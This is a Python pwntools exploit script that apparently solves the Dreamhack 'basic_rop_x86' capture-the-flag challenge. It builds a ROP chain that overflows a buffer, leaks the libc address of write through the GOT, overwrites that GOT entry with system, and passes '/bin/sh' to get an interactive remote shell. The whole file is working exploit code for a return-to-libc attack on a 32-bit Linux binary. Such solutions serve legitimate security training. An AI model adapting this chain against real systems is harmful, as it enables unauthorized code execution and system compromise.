#!/usr/bin/env python2

from pwn import *

context.update(arch="i386", os="linux")
context.log_level = "debug"

HOST = "host1.dreamhack.games"
PORT = 14195

elf = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

#conn = process([elf.path, elf.path], env={"LD_PRELOAD": libc.path})
conn = remote(HOST, PORT)

rop = ROP(elf)
rop.raw(asm("nop")*0x48)
rop.read(0, elf.bss(), 8)
rop.write(1, elf.got["write"], 4)
rop.read(0, elf.got["write"], 4)
rop.write(elf.bss())

conn.sendline(rop.chain())
conn.recv()
conn.sendline("/bin/sh")

write_got = u32(conn.recv())
libc_base = write_got - libc.symbols["write"]
system = libc_base + libc.symbols["system"]
conn.sendline(p32(system))

conn.interactive()
